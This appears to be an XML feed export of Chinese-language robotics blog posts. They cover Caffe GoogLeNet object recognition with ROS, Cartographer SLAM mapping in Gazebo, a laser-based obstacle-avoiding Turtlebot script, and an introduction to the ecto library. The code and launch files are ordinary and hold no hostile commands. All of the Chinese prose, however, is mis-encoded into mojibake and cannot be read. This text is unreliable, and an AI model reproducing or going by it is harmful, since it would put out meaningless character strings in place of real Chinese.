    <content><![CDATA[ç°¡ä»‹é€™æ¬¡è¦è«‡çš„å…§å®¹ï¼Œæ˜¯ä½¿ç”¨æ·±åº¦å­¸ç¿’(Deep Learing)çš„æ¨¡å‹ä¾†è®“æ©Ÿå™¨äººåšç‰©é«”è¾¨è­˜ã€‚æ·±åº¦å­¸ç¿’åœ¨é€™å¹¾å¹´ä¾†è®Šå¾—å¾ˆç«ç´…ï¼Œç›¸é—œçš„æ¡†æ¶ä¹Ÿç›¸ç•¶å¤šï¼Œé€™æ¬¡ä¹‹æ‰€ä»¥æƒ³è«‡caffeï¼Œæ˜¯å› ç‚ºå·²ç¶“æœ‰ç¾æˆçš„æ–¹æ³•å¯ä»¥å°‡å®ƒæ‡‰ç”¨åˆ°æ©Ÿå™¨äººä¸Šé¢ã€‚ï¼ˆæœ‰ä½å°ç£çš„é–‹ç™¼è€…å¼„äº†ä¸€å€‹å«åšros_caffeçš„packageä¾†ä¸²æ¥ROS(æ©Ÿå™¨äººä½œæ¥­ç³»çµ±)è·ŸCaffeï¼Œå¯ä»¥å°‡Caffeè¾¨è­˜çš„çµæœä¸Ÿåˆ°ä¸€å€‹ROSçš„topicï¼Œå…¶ä»–çš„nodeå°±å¯ä»¥è‡ªå·±å–ç”¨ã€‚é€™ä½¿å¾—æ©Ÿå™¨äººè¾¨è­˜ç‰©é«”çš„èƒ½åŠ›å¾—ä»¥å¤§å¹…å¢åŠ ï¼‰
ä¸€é»é»å¹«åŠ©å…¥é–€çš„ç´°ç¯€åŸºæœ¬çš„å®‰è£æ–¹æ³•å¯ä»¥åƒè€ƒé€™å€‹é€£çµï¼Œå‡è¨­å·²ç¶“è£æˆåŠŸï¼Œé‚£è‡³å°‘å°±å·²ç¶“æœ‰åŸºæœ¬çš„ç’°å¢ƒå¯ä»¥ç”¨(æœ‰ä¸€å€‹caffeçš„è³‡æ–™å¤¾è¢«æ”¾åœ¨ä½ å®‰è£çš„è·¯å¾‘)ï¼Œæ¥ä¸‹ä¾†éœ€è¦ä¸‹è¼‰GoogLeNetçš„modelï¼Œåªè¦ç”¨caffe&#x2F;scriptsè³‡æ–™å¤¾è£¡çš„ç¨‹å¼å¹«å¿™å°±è¡Œäº†:
$./scripts/download_model_binary.py ./models/bvlc_googlenet
ä¸Šé¢é€™å€‹æŒ‡ä»¤æœƒå°‡GoogLeNetçš„modelä¸‹è¼‰åˆ°caffe&#x2F;models&#x2F;bvlc_googlenetï¼Œå‡è¨­å·²ç¶“ä¸‹è¼‰å¥½modelï¼Œæ¥ä¸‹ä¾†å°±å¯ä»¥ç”¨ä¸€å€‹å°ç¨‹å¼ä¾†è·‘è·‘çœ‹GoogLeNetäº†:
import numpy as npimport matplotlib.pyplot as plt 	# Make sure that caffe is on the python path:caffe_root = &#x27;../&#x27; # this file is expected to be in &#123;caffe_root&#125;/examplesimport syssys.path.insert(0, caffe_root + &#x27;python&#x27;)sys.path.append(&amp;quot;/usr/lib/python2.7/dist-packages/&amp;quot;) import caffe# Set the right path to your model definition file, pretrained model weights,# and the image you would like to classify.MODEL_FILE = &#x27;../models/bvlc_googlenet/deploy.prototxt&#x27;PRETRAINED = &#x27;../models/bvlc_googlenet/bvlc_googlenet.caffemodel&#x27;IMAGE_FILE = &#x27;images/cat.jpg&#x27; caffe.set_mode_cpu()net = caffe.Classifier(MODEL_FILE, PRETRAINED,mean=np.load(caffe_root + &#x27;python/caffe/imagenet/ilsvrc_2012_mean.npy&#x27;).mean(1).mean(1),channel_swap=(2,1,0),raw_scale=255,image_dims=(256, 256)) input_image = caffe.io.load_image(IMAGE_FILE)plt.imshow(input_image)plt.show() prediction = net.predict([input_image])plt.plot(prediction[0])plt.show()print &#x27;predicted class:&#x27;, prediction[0].argmax()

æ¥ä¸‹ä¾†åªè¦åŸ·è¡Œ(å› ç‚ºç¨‹å¼æ”¾åœ¨examplesè³‡æ–™å¤¾åº•ä¸‹):
$python ./examples/googlenet_example.py
å°±å¯ä»¥çœ‹åˆ°ä¸€éš»è²“çš„å½±åƒï¼Œé—œæ‰å½±åƒä¹‹å¾Œå°±æœƒçœ‹åˆ°è²“çš„é¡åˆ¥:

ä¸²æ¥ros_caffeå¦‚æœæƒ³å¾€ä¸‹è·Ÿros_caffeçš„ä¸²æ¥å¯ä»¥åƒè€ƒå¤–åœ‹é„‰æ°‘çš„æ–‡ç« ï¼Œè£¡é¢æœ‰å®Œæ•´è€Œè©³ç´°çš„æ­¥é©Ÿã€‚å¦‚æœä½ å·²ç¶“å®‰è£écaffeï¼Œå¯ä»¥åƒè€ƒé€™å€‹issueã€‚
éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¤–åœ‹é„‰æ°‘è·‘çš„åªæœ‰globalçš„çµæœï¼Œä¹Ÿå°±æ˜¯ä¸€å¼µå½±åƒä¸­åªæœ‰ä¸€å€‹æœ€é¡¯è‘—çš„ç‰©é«”æœƒè¢«è¾¨è­˜ï¼Œå¦‚æœè¦è¾¨è­˜ä¸€å¼µå½±åƒä¸­çš„å„å€‹ç‰©é«”ï¼Œå¯èƒ½å°±è¦è‡ªå·±åœ¨ä¸­é–“ä¸²æ¥ä¸€å€‹è² è²¬åšsegmentationçš„nodeï¼Œå†æŠŠå„å€‹åˆ‡å‡ºä¾†çš„å€å¡Šé¤µçµ¦ros_caffeä¾†åšè¾¨è­˜ã€‚
é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨é›éŠè‡ªå·±çš„åŸ·è¡ŒåŠ›
]]></content>
      <tags>
        <tag>æ©Ÿå™¨äºº, æ·±åº¦å­¸ç¿’, Deep Learing, Robot, GoogLeNet, Caffe</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•ä½¿ç”¨ Google Cartographer SLAM æ¼”ç®—æ³•ä¾†å»ºåœ°åœ–</title>
    <url>/2016/10/29/ros-cartographer-slam-basic/</url>
    <content><![CDATA[å‰è¨€Cartographer æ˜¯ Google æœ€è¿‘å‰›ç™¼è¡¨çš„ SLAM æ¼”ç®—æ³•ï¼Œæ•ˆæœçœ‹èµ·ä¾†éå¸¸å¥½ï¼Œè€Œä¸”ä»–å€‘ç™¼è¡¨çš„è«–æ–‡è£¡ä¸»æ‰“é€™å€‹æ¼”ç®—æ³•å¾ˆ real-timeï¼Œä»Šå¤©å°±ä¾†å¸¶å¤§å®¶æŠŠé€™å€‹æ¼”ç®—æ³•åœ¨è‡ªå·±çš„ç’°å¢ƒä¸­è·‘èµ·ä¾†ï¼Œä¹‹å¾Œå°±å¯ä»¥è‡ªå·±ç©äº†ã€‚

å»ºç«‹æ¨¡æ“¬ç’°å¢ƒæˆ‘çš„æ¸¬è©¦ç’°å¢ƒæ˜¯ Ubuntu 14.04 + ROS Indigoï¼Œä¸éä½¿ç”¨çš„æŒ‡ä»¤éƒ½å¾ˆ generalï¼Œå³ä¾¿ä½ ä½¿ç”¨å…¶ä»–ç‰ˆæœ¬ï¼Œæ‡‰è©²ä¹Ÿä¸æœƒæœ‰ä»€éº¼å•é¡Œã€‚
é¦–å…ˆæˆ‘å€‘ç¢ºå®šå·²ç¶“å®‰è£æ‰€éœ€è¦çš„å¥—ä»¶ï¼š
sudo apt-get install ros-indigo-gazebo-*

æ¥ä¸‹ä¾†åœ¨çµ‚ç«¯æ©Ÿè¼¸å…¥ gazebo æ‡‰è©²å°±å¯ä»¥æˆåŠŸå•Ÿå‹• Gazebo æ¨¡æ“¬å™¨ã€‚ç„¶å¾Œæˆ‘å€‘å¯ä»¥ç”¨ç¾æˆçš„ package å•Ÿå‹•ä¸€å€‹æœ‰ PR2 çš„è¤‡é›œç’°å¢ƒã€‚
roslaunch pr2_gazebo pr2_wg_world.launch

ç†è«–ä¸Šï¼Œä½ æœƒç¢°åˆ°ä¸€å€‹ error èªªï¼š
unused args [paused, gui] for include of [/opt/ros/jade/share/gazebo_ros/launch/willowgarage_world.launch] The traceback for the exception was written to the log file

é€™æ™‚å€™åªè¦å»ç·¨è¼¯ä½ çš„ pr2_wg_world.launchï¼ŒæŠŠæœ‰ arg çš„éƒ¨åˆ†è¨»è§£æ‰å°±å¥½ï¼Œè¨»è§£å®Œçš„æª”æ¡ˆçœ‹èµ·ä¾†æœƒåƒä¸‹é¢é€™æ¨£ï¼š
&lt;launch&gt;  &lt;!-- start up empty world --&gt;  &lt;!-- &lt;arg name=&quot;gui&quot; default=&quot;true&quot;/&gt;  &lt;arg name=&quot;paused&quot; default=&quot;true&quot;/&gt; --&gt;  &lt;!-- TODO: throttled not implemented in gazebo_ros/empty_world.launch  &lt;arg name=&quot;throttled&quot; default=&quot;false&quot;/&gt;  --&gt;  &lt;include file=&quot;$(find gazebo_ros)/launch/willowgarage_world.launch&quot;&gt;    &lt;!-- &lt;arg name=&quot;gui&quot; value=&quot;$(arg gui)&quot; /&gt;    &lt;arg name=&quot;paused&quot; value=&quot;$(arg paused)&quot; /&gt; --&gt;    &lt;!-- TODO: throttled not implemented in gazebo_ros/empty_world.launch    &lt;arg name=&quot;throttled&quot; value=&quot;$(arg throttled)&quot; /&gt;    --&gt;  &lt;/include&gt;  &lt;!-- start pr2 robot --&gt;  &lt;include file=&quot;$(find pr2_gazebo)/launch/pr2.launch&quot;/&gt;&lt;/launch&gt;

è¨»è§£å®Œç•¢å°±å¯ä»¥å•Ÿå‹•å•¦ã€‚å•Ÿå‹•ä¹‹å¾Œçš„ç’°å¢ƒæœƒé•·å¾—åƒä¸‹é¢é€™æ¨£ï¼š


å®‰è£ &amp; å•“å‹• Cartographerå®‰è£çš„æ–¹æ³•æ»¿ç°¡å–®çš„ï¼Œåªè¦ç…§è‘—å®˜æ–¹æ–‡ä»¶ä¸Šçš„æ­¥é©Ÿåšå°±å¯ä»¥äº†ï¼š
# Install wstool and rosdep.sudo apt-get updatesudo apt-get install -y python-wstool python-rosdep ninja-build# Create a new workspace in &#x27;catkin_ws&#x27;.mkdir catkin_wscd catkin_wswstool init src# Merge the cartographer_ros.rosinstall file and fetch code for dependencies.wstool merge -t src https://raw.githubusercontent.com/googlecartographer/cartographer_ros/master/cartographer_ros.rosinstallwstool update -t src# Install deb dependencies.rosdep initrosdep updaterosdep install --from-paths src --ignore-src --rosdistro=$&#123;ROS_DISTRO&#125; -y# Build and install.catkin_make_isolated --install --use-ninjasource install_isolated/setup.bash

é‡é»æ˜¯è£å®Œä¹‹å¾Œï¼Œæˆ‘å€‘æƒ³è¦è·‘ cartographer_ros package è£¡é¢çš„ demo_pr2.launchï¼Œä½†è£¡é¢åŸæœ¬é è¨­æ˜¯è·‘ bag file çš„ demo ç‰ˆæœ¬ï¼Œæ‰€ä»¥æˆ‘å€‘è¦ç¨å¾®ä¿®æ”¹ä¸€ä¸‹ demo_pr2.launch ï¼š
rosed cartographer_ros demo_pr2.launch

&lt;!--  Copyright 2016 The Cartographer Authors  Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);  you may not use this file except in compliance with the License.  You may obtain a copy of the License at       http://www.apache.org/licenses/LICENSE-2.0  Unless required by applicable law or agreed to in writing, software  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  See the License for the specific language governing permissions and  limitations under the License.--&gt;&lt;launch&gt;  &lt;param name=&quot;/use_sim_time&quot; value=&quot;true&quot; /&gt;  &lt;node name=&quot;cartographer_node&quot; pkg=&quot;cartographer_ros&quot;      type=&quot;cartographer_node&quot; args=&quot;          -configuration_directory              $(find cartographer_ros)/configuration_files          -configuration_basename pr2.lua&quot;      output=&quot;screen&quot;&gt;    &lt;remap from=&quot;scan&quot; to=&quot;/base_scan&quot; /&gt;  &lt;/node&gt;  &lt;node name=&quot;tf_remove_frames&quot; pkg=&quot;cartographer_ros&quot;      type=&quot;tf_remove_frames.py&quot;&gt;    &lt;remap from=&quot;tf_out&quot; to=&quot;/tf&quot; /&gt;    &lt;rosparam param=&quot;remove_frames&quot;&gt;      - map      - odom_combined    &lt;/rosparam&gt;  &lt;/node&gt;  &lt;node name=&quot;rviz&quot; pkg=&quot;rviz&quot; type=&quot;rviz&quot; required=&quot;true&quot;      args=&quot;-d $(find cartographer_ros)/configuration_files/demo_2d.rviz&quot; /&gt;&lt;/launch&gt;

ä¿®æ”¹å®Œä¹‹å¾Œå°±å¯ä»¥åŸ·è¡Œäº†ï¼Œé€™æ™‚æ‡‰è©²å¯ä»¥çœ‹åˆ° Rviz çš„è¦–çª—è·³å‡ºä¾†ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°ç›®å‰çš„åœ°åœ–ã€‚
roslaunch cartographer_ros demo_pr2.launch

Teleop PR2 ä¾†å»ºåœ°åœ–å›‰åªè¦å•Ÿå‹• teleop_keyborad å°±å¯ä»¥ç”¨éµç›¤æ§åˆ¶æ©Ÿå™¨äººç§»å‹•ï¼š
roslaunch pr2_teleop teleop_keyboard.launch

WASD å››å€‹æŒ‰éµåˆ†åˆ¥ä»£è¡¨å‰å·¦å¾Œå³å››å€‹æ–¹å‘çš„å¹³ç§»ã€QEå…©å€‹æŒ‰éµæ˜¯åŸåœ°æ—‹è½‰ï¼Œé€™é‚Šè¦æ³¨æ„å¿…é ˆé¸åˆ°å•Ÿå‹• teleop_keyboardçš„è¦–çª—ï¼ŒæŒ‰æŒ‰éµæ‰æœ‰ç”¨ã€‚ä½¿ç”¨ teleop ä¾†æ§åˆ¶ PR2 èµ°ä¸€èµ°ä¹‹å¾Œï¼Œå°±å¯ä»¥çœ‹å¾—å‡ºæˆ‘å€‘å·²ç¶“å»ºç«‹äº†ä¸€å€‹æœ‰æ¨¡æœ‰æ¨£çš„åœ°åœ–ã€‚ä¸éå› ç‚ºé€™å€‹åœ°åœ–å¤ªå¤§ï¼Œæˆ‘å°±ä¸èµ°å®Œäº†ã€‚

ç¸½çµä»Šå¤©ä¸»è¦å¸¶å¤§å®¶æŠŠ Cartographer è·‘èµ·ä¾†ï¼ŒæŠŠåŸæœ¬ demo ç”¨çš„ç‰ˆæœ¬æ›æˆå¯ä»¥æ¥ä¸Šè‡ªå·±çš„æ©Ÿå™¨äººï¼Œæœ‰èˆˆè¶£æ·±å…¥ç ”ç©¶çš„è®€è€…å¯ä»¥æ­é…è«–æ–‡ï¼Œæœ‰äº†å¯ä»¥ç©çš„ç’°å¢ƒå’Œç¨‹å¼ç¢¼å¯ä»¥åƒè€ƒï¼Œå­¸ç¿’èµ·ä¾†æœƒæ¯”è¼ƒæœ‰æ„Ÿã€‚
å»¶ä¼¸é–±è®€
Cartographerè«–æ–‡

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨é›éŠè‡ªå·±çš„åŸ·è¡ŒåŠ›
]]></content>
      <tags>
        <tag>æ©Ÿå™¨äºº, Robot, ROS, Gazebo, Cartographer, SLAM</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨ ROS èˆ‡ Gazebo æ¨¡æ“¬ä¸€å€‹è‡ªå‹•é¿éšœæ©Ÿå™¨äºº</title>
    <url>/2016/09/28/ros-collision-avoiding-robot/</url>
    <content><![CDATA[å‰è¨€æ©Ÿå™¨äººè¦åœ¨ç’°å¢ƒä¸­éš¨å¿ƒæ‰€æ¬²ç§»å‹•ï¼Œéœ€è¦çš„æœ€åŸºç¤åŠŸèƒ½ä¹‹ä¸€å°±æ˜¯é¿éšœã€‚è¦èƒ½å¤ é¿éšœçš„é¦–è¦æ¢ä»¶æ˜¯è¦æœ‰æ„Ÿæ¸¬å™¨æ¥æ”¶ç’°å¢ƒä¸­çš„è³‡è¨Šï¼Œæ‰èƒ½è—‰ç”±é€™å€‹è³‡è¨Šåˆ¤æ–·éšœç¤™ç‰©æ˜¯å¦å­˜åœ¨ã€‚
å¸¸è¦‹çš„æ„Ÿæ¸¬å™¨åŒ…å«ç´…å¤–ç·šæ„Ÿæ¸¬å™¨ã€è¶…éŸ³æ³¢æ„Ÿæ¸¬å™¨ã€é›·å°„æ¸¬è·å„€ã€ä¸€èˆ¬çš„ç›¸æ©Ÿã€RGB-D æ„Ÿæ¸¬å™¨ç­‰ç­‰ï¼Œåº•å±¤çš„æ„Ÿæ¸¬å™¨ driver ä¸åœ¨é€™ç¯‡æ–‡ç« çš„è¨è«–ç¯„åœè£¡ï¼Œæˆ‘å€‘å…ˆå–®ç´”çœ‹çœ‹æ€éº¼ä½¿ç”¨æ”¶åˆ°çš„ laser data ä¾†é¿éšœã€‚
å»ºç«‹æ¨¡æ“¬ç’°å¢ƒæˆ‘å€‘å…ˆç”¨ Gazebo å»ºç«‹ä¸€å€‹ç°¡å–®çš„ç’°å¢ƒï¼ŒåŠ ä¸Šå¹¾å€‹éšœç¤™ç‰©ï¼Œå°±å¯ä»¥æŠŠé€™å€‹ world å­˜èµ·ä¾†äº† (é€™é‚Šå…ˆå«åš simple_wall.world )ã€‚æ¥ä¸‹ä¾†æˆ‘å€‘è¦å¯«ä¸€å€‹ launch æª”ï¼Œåœ¨å•Ÿå‹• Gazebo çš„æ™‚å€™å°±è¼‰å…¥å‰›å‰›å­˜çš„ worldï¼ŒåŠ å…¥ä¸€éš» Turtlebotï¼Œä¸¦è®“é€™éš» Turtlebot æœ‰ä¸€é¡†æ¨¡æ“¬çš„é›·å°„æ¸¬è·å„€ã€‚ç›¸é—œçš„æª”æ¡ˆéƒ½å¯ä»¥åœ¨é€™é‚Šæ‰¾åˆ°ã€‚
è€Œä¸Šé¢æåˆ°çš„é€™äº›æ±è¥¿éƒ½å¯ä»¥ç”¨ä¸€å€‹ launch æª”æå®šï¼š
&lt;launch&gt;  &lt;param name=&quot;robot_description&quot; command=&quot;$(find xacro)/xacro.py &#x27;$(find turtlebot_description)/robots/kobuki_hexagons_kinect.urdf.xacro&#x27;&quot; /&gt;  &lt;arg name=&quot;world_file&quot;  default=&quot;$(find assignment_3)/world/simple_wall.world&quot;/&gt;  &lt;arg name=&quot;base&quot;      value=&quot;$(optenv TURTLEBOT_BASE kobuki)&quot;/&gt; &lt;!-- create, roomba --&gt;  &lt;arg name=&quot;battery&quot;   value=&quot;$(optenv TURTLEBOT_BATTERY /proc/acpi/battery/BAT0)&quot;/&gt;  &lt;!-- /proc/acpi/battery/BAT0 --&gt;   &lt;arg name=&quot;gui&quot; default=&quot;true&quot;/&gt;  &lt;arg name=&quot;stacks&quot;    value=&quot;$(optenv TURTLEBOT_STACKS hexagons)&quot;/&gt;  &lt;!-- circles, hexagons --&gt;   &lt;arg name=&quot;3d_sensor&quot; value=&quot;$(optenv TURTLEBOT_3D_SENSOR kinect)&quot;/&gt;  &lt;!-- kinect, asus_xtion_pro --&gt;   &lt;include file=&quot;$(find gazebo_ros)/launch/empty_world.launch&quot;&gt;    &lt;arg name=&quot;use_sim_time&quot; value=&quot;true&quot;/&gt;    &lt;arg name=&quot;debug&quot; value=&quot;false&quot;/&gt;    &lt;arg name=&quot;gui&quot; value=&quot;$(arg gui)&quot; /&gt;    &lt;arg name=&quot;world_name&quot; value=&quot;$(arg world_file)&quot;/&gt;  &lt;/include&gt;  &lt;node name=&quot;spawn_turtlebot_model&quot; pkg=&quot;gazebo_ros&quot; type=&quot;spawn_model&quot; args=&quot;$(optenv ROBOT_INITIAL_POSE) -unpause -urdf -param robot_description -model turtlebot&quot; respawn=&quot;false&quot; output=&quot;screen&quot;/&gt;    &lt;node pkg=&quot;robot_state_publisher&quot; type=&quot;robot_state_publisher&quot; name=&quot;robot_state_publisher&quot;&gt;	  &lt;param name=&quot;publish_frequency&quot; type=&quot;double&quot; value=&quot;30.0&quot; /&gt;  &lt;/node&gt;    &lt;!-- Fake laser --&gt;  &lt;node pkg=&quot;nodelet&quot; type=&quot;nodelet&quot; name=&quot;laserscan_nodelet_manager&quot; args=&quot;manager&quot;/&gt;  &lt;node pkg=&quot;nodelet&quot; type=&quot;nodelet&quot; name=&quot;depthimage_to_laserscan&quot;        args=&quot;load depthimage_to_laserscan/DepthImageToLaserScanNodelet laserscan_nodelet_manager&quot;&gt;    &lt;param name=&quot;scan_height&quot; value=&quot;10&quot;/&gt;    &lt;param name=&quot;output_frame_id&quot; value=&quot;/camera_depth_frame&quot;/&gt;    &lt;param name=&quot;range_min&quot; value=&quot;0.45&quot;/&gt;    &lt;remap from=&quot;image&quot; to=&quot;/camera/depth/image_raw&quot;/&gt;    &lt;remap from=&quot;scan&quot; to=&quot;/scan&quot;/&gt;  &lt;/node&gt;&lt;/launch&gt;

å•Ÿå‹•ä¹‹å¾Œçš„æ¨¡æ“¬ç’°å¢ƒå¦‚ä¸‹ï¼š

å¯¦ä½œé¿éšœæ¼”ç®—æ³•æœ‰äº†æ¨¡æ“¬ç’°å¢ƒè·Ÿæ©Ÿå™¨äººå¾Œï¼Œæ¥ä¸‹ä¾†å°±æ˜¯è¦å¯¦ä½œæ§åˆ¶æ©Ÿå™¨äººè¡Œç‚ºçš„æ¼”ç®—æ³•å•¦ã€‚é€™é‚Šç”¨åˆ°çš„æ¼”ç®—æ³•å¾ˆç°¡å–®ï¼Œç¨‹å¼ç¢¼ä¹Ÿå°±ä¸é•·:
#!/usr/bin/env pythonimport rospyfrom geometry_msgs.msg import Twistfrom sensor_msgs.msg import LaserScanranges = []def callback(data):    global ranges    ranges = data.ranges    # (data.angle_max - data.angle_min)/data.angle_increment: 638.99    # len(data.ranges):640def random_walker():    pub = rospy.Publisher(&#x27;/mobile_base/commands/velocity&#x27;, Twist, queue_size=10)    sub = rospy.Subscriber(&#x27;/scan&#x27;, LaserScan, callback)    rospy.init_node(&#x27;turtlebot_random_exploration_node&#x27;)    rate = rospy.Rate(10)    cmd = Twist()    while not rospy.is_shutdown():        #data.range_min == 0, can be ignored in this case        global ranges        distance_smaller_than_thres = [i for i in ranges if i &lt;= 0.5]        if( len(distance_smaller_than_thres) &gt; 0):            cmd.linear.x = 0            cmd.angular.z = 0.5                        pub.publish(cmd)            rate = rospy.Rate(1)            rate.sleep()        else:            cmd.linear.x = 0.1            cmd.angular.z = 0            pub.publish(cmd)            rate = rospy.Rate(10)            rate.sleep()if __name__ == &#x27;__main__&#x27;:    try:        random_walker()    except rospy.ROSInterruptException:        pass

ä¸»è¦æ§åˆ¶æ©Ÿå™¨äººç§»å‹•çš„å‡½å¼æ˜¯ random_walker() ï¼Œä¸€é€²å…¥é€™å€‹å‡½å¼ï¼Œå°±æœƒå…ˆåˆå§‹åŒ–é€å‡ºç§»å‹•å‘½ä»¤çš„ publisher ï¼Œä¹Ÿæœƒåˆå§‹åŒ–æ¥æ”¶ laser data çš„ subscriberï¼Œåªè¦ä¸€æ”¶åˆ°æ–°çš„ laser data å°±æœƒå‘¼å« callback() å‡½å¼æ›´æ–° range é€™å€‹å…¨åŸŸè®Šæ•¸ï¼Œé€™é‚Šå°±è¦ç¨å¾®è§£é‡‹ä¸€ä¸‹ LaserScan é€™å€‹ msg äº†ã€‚
åŸºæœ¬ä¸Šï¼Œå› ç‚º LaserScan é€™ç¨®è³‡æ–™çµæ§‹å¤ªå¸¸ç”¨ï¼Œæ‰€ä»¥ ROS å®˜æ–¹æä¾›çš„ sensor_msgs package è£¡é¢å°±å·²ç¶“åŒ…å«äº† LaserScan.msgï¼Œå®ƒçš„å®šç¾©åœ¨ç¶²è·¯ä¸Šå¾ˆå®¹æ˜“æ‰¾åˆ°ï¼š

å¯ä»¥çœ‹åˆ°è£¡é¢åŒ…å«äº†è¨±å¤šè³‡è¨Šï¼Œä¾‹å¦‚æ”¶åˆ° data çš„æœ€å°è§’åº¦å’Œæœ€å¤§è§’åº¦ã€å›å‚³å¾—åˆ°çš„è·é›¢è³‡è¨Šç­‰ç­‰ï¼Œæˆ‘å€‘é€™é‚Šåªå–®ç´”ç”¨åˆ°è·é›¢è³‡è¨Šï¼Œæ‰€ä»¥åªç”¨åˆ° ranges çš„è³‡æ–™å°±å¤ äº†ã€‚
æ‰€ä»¥åœ¨ random_walker() çš„ while è¿´åœˆè£¡é¢ï¼Œå°±æ˜¯ä¸æ–·åœ°å»åˆ¤æ–· ranges è£¡é¢çš„è·é›¢æœ‰æ²’æœ‰å°æ–¼ 0.5 å…¬å°ºçš„ï¼Œå¦‚æœæœ‰ï¼Œå°±è®“æ©Ÿå™¨äººåœä¸‹ä¾†åŸåœ°æ—‹è½‰ï¼›å¦‚æœæ²’æœ‰ï¼Œé‚£å°±è®“æ©Ÿå™¨äººç¹¼çºŒå¾€å‰é€²ã€‚å¤ ç°¡å–®äº†å§ã€‚
è¦åŸ·è¡Œçš„è©±ï¼Œå› ç‚ºæˆ‘å‰›å¥½å·²ç¶“æœ‰ä¸€å€‹ç¾æˆçš„ repository å¯ä»¥ç”¨ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¼‰ä¾†ç©ï¼š
cd catkin_ws/srcgit clone https://github.com/Po-Jen/sd-ros-class.gitcd .. &amp; catkin_makesource devel/setup.bashroslaunch assignment3 gazebo_random_walker_and_gmapping.launch

å¦‚æœä½ æˆåŠŸè·‘èµ·ä¾†ï¼Œæ‡‰è©²å¯ä»¥çœ‹åˆ° Turtlebot åœ¨ Gazebo è£¡é¢ç·©æ…¢åœ°ç§»å‹•ã€‚æˆ‘é‚„é †ä¾¿åŠ ä¸Šäº† gmapping çš„ nodeï¼Œæ‰€ä»¥æ‡‰è©²å¯ä»¥åœ¨ Rviz çœ‹åˆ°å»ºç«‹å‡ºä¾†çš„åœ°åœ–ã€‚

ç¸½çµé€™å‘¨æ•™å¤§å®¶å¯«ä¸€å€‹ç°¡å–®çš„é¿éšœæ©Ÿå™¨äººï¼Œå¯ä»¥æ ¹æ“š laser data åˆ¤æ–·æ©Ÿå™¨äººé™„è¿‘æœ‰æ²’æœ‰éšœç¤™ç‰©ï¼Œåªè¦éšœç¤™ç‰©å¤ªéé è¿‘å°±åœä¸‹ä¾†è½‰å€‹æ–¹å‘ï¼Œé›–ç„¶æ¦‚å¿µå¾ˆç°¡å–®ï¼Œä¸éå°æ–¼å…¥é–€çš„è®€è€…ä¾†èªªï¼Œè¦å¯¦ä½œå‡ºä¾†ä¹Ÿæ˜¯éœ€è¦æ€è€ƒä¸€ä¸‹ï¼Œå¸Œæœ›é€™ç¯‡æ–‡ç« å¯ä»¥è®Šæˆè¸è…³çŸ³ï¼Œè®“æƒ³ç©ç§»å‹•æ©Ÿå™¨äººçš„è®€è€…å¯ä»¥ä¸Šæ‰‹ã€‚
å»¶ä¼¸é–±è®€
æƒåœ°æ©Ÿå™¨äººç®—æ³•çš„ä¸€äº›æƒ³æ³•å’Œæ¸¬è©¦
Robot exploration algorithm

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨é›éŠè‡ªå·±çš„åŸ·è¡ŒåŠ›
]]></content>
      <tags>
        <tag>æ©Ÿå™¨äºº, Robot, ROS, Turtlebot, Gazebo</tag>
      </tags>
  </entry>
  <entry>
    <title>ecto ç°¡ä»‹ (1) â€“ cell èˆ‡ plasm</title>
    <url>/2016/06/08/ros-ecto-first/</url>
    <content><![CDATA[å‰è¨€é€™æ¬¡æƒ³è¦è·Ÿå¤§å®¶ä»‹ç´¹ ROS ORK (Object Recognition Kitchen) é€™å€‹å‡½å¼åº«å¯¦ä½œç‰©é«”è¾¨è­˜ pipeline çš„æ©Ÿåˆ¶ï¼Œå…¶èƒŒå¾Œé‹ç”¨åˆ°çš„ä¸€å€‹é‡è¦çš„å‡½å¼åº«å«åš ecto ï¼Œæ¥ä¸‹ä¾†æœƒä»‹ç´¹ ecto çš„åŸºæœ¬è§€å¿µå’Œç”¨æ³•ã€‚ä½†å› ç‚ºæˆ‘æƒ³æŠŠå…§å®¹è¬›è§£å¾—æ¯”è¼ƒè©³ç´°ï¼Œæ‰€ä»¥ä¸æœƒåªèŠ±ä¸€ç¯‡æ–‡ç« çš„ç¯‡å¹…å°±ä»‹ç´¹å®Œé€™å€‹å·¥å…·ï¼Œé€™ä¸€ç¯‡æœƒè¬›åˆ°æœ€åŸºæœ¬çš„ cell èˆ‡ plasmï¼Œè®“å¤§å®¶å…ˆæœ‰åˆæ­¥çš„èªè­˜ï¼Œæ›´é€²éšçš„ç”¨æ³•ç”šè‡³æ˜¯å¯¦ä¾‹æœƒåœ¨ä¹‹å¾Œçš„æ–‡ç« ä»‹ç´¹ã€‚
ecto æ˜¯ä»€éº¼ &amp; ç‚ºä»€éº¼è¦ä½¿ç”¨ ectoå¯ä»¥æŠŠ ecto æƒ³æˆä¸€å€‹æ¡†æ¶ï¼Œé€™å€‹æ¡†æ¶å¯ä»¥è®“ä½ å¾ˆæ–¹ä¾¿åœ°æŠŠç¨‹å¼ç”¨ DAG (Directed Acyclic Graph) çš„æ–¹å¼ä¾†å¯¦ä½œï¼Œé€™æ¨£å¯¦ä½œçš„å…©å¤§å¥½è™•åœ¨æ–¼æ¨¡çµ„åŒ–è·Ÿå½ˆæ€§ã€‚
DAGçš„ä¸€å€‹ç¯„ä¾‹åœ–ï¼š

